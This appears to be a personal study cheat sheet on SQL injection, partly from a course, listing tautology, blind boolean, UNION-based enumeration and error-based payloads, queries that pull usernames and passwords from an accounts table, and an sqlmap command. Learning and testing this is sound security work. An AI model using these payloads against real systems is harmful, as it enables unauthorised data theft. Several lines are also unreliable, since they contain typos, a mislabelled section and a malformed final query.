
## SQL Testing :


- __Define__ all the user inputs and fields 

- __Confirm__ the web app backend runs SQL. One way of confi rming that the application is interacting with a backend
              database is to submit the SQL wildcard character % in a given parameter

- __Submit a single quotation__ mark as the item of data you are targeting.


- Observe whether an error occurs, or whether the result differs from the original in any other way.
  

- __submit two single quotation__ marks together for testing. Sometimes one single quote is not enough to show the error.


__Basic Payloads___


    >> ' OR 1=1 ;--
    
    >> ') OR 1=1; --
    
    
- __URL encodings__ are necessary whether you are editing the parameter’s  value directly from your browser, with an intercepting 
                    proxy, or through any other means.
    
    

&nbsp; 
 &nbsp; 
 &nbsp; 
   
### Blind SQL : 

This type of SQL injection is based on booleans : True or False .


- ' and 'a'='a

- ' and 'a'='b

- ' and substring(@@version,1,1)='5   &nbsp; |  &nbsp; find the version of the db


if you get a error means that SQL vulnerability is error based, if not means blind SQl.

For Blind SQL, we need to focus on the behavior of the application and try different queries :

>>> ' and 'a'='a    |  if data displayed mean that there is SQL vulnerability 


>>> ' UNION SELECT null;-- - |  this command is used to enumerate the database in order to know the number of columns it has


>>>  ' UNION SELECT "else1";-- - | test the query with string,or intger to see the type of data in the columns

>>>> 99999 ' UNION SELECT null;-- - |  to display our entered data on the fields


>>>  99999 UNION SELECT @@version;| @@version is to know the version of the db

>>>




Automate the process of SQL blind
>> script 

&nbsp; 
 &nbsp; 
 &nbsp; 
   
### Band SQL:

- ' and 'a'='a

- ' and 'a'='b

- 9999' UNION SELECT name,222,'else1' FROM master.syslogin; --

### Error based SQL:

- 1 or db_name()=1);

- 1 or db_name(0)=1) | increase the number until the database does not show any errors

- 

 
 &nbsp; 
 &nbsp; 
 &nbsp; 
   
### SQLmap:

- sqlmap  &nbsp; -u URL  &nbsp; -p search  &nbsp; --technique=U |  &nbsp; U for Union Selection



## [PentesMonkey CheatSheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

 &nbsp; 
 &nbsp; 
 &nbsp; 
------------------------------------------------------------------------------------------------------------------------------

## [Notes from Udemy Course]

>> http://www.site.com/news/php=7' order by 1 # |  &nbsp;  use order by 1 followed by # as a comment 

__URL Encoding__:  http://www.site.com/news/php=7' order by 1 %23

order by shows how many columns in the DB

 &nbsp; 
 &nbsp

>> ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'

__information_schema__ is a default schema in every database

__table_schema__ is the database name 

__table_name__ is the name of the table 


The above SQL command should return the name of the schemas in the database 

 &nbsp; 
 &nbsp
 
>>>> ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'

>>> ' union select username, pass, is_admin from 'accounts'




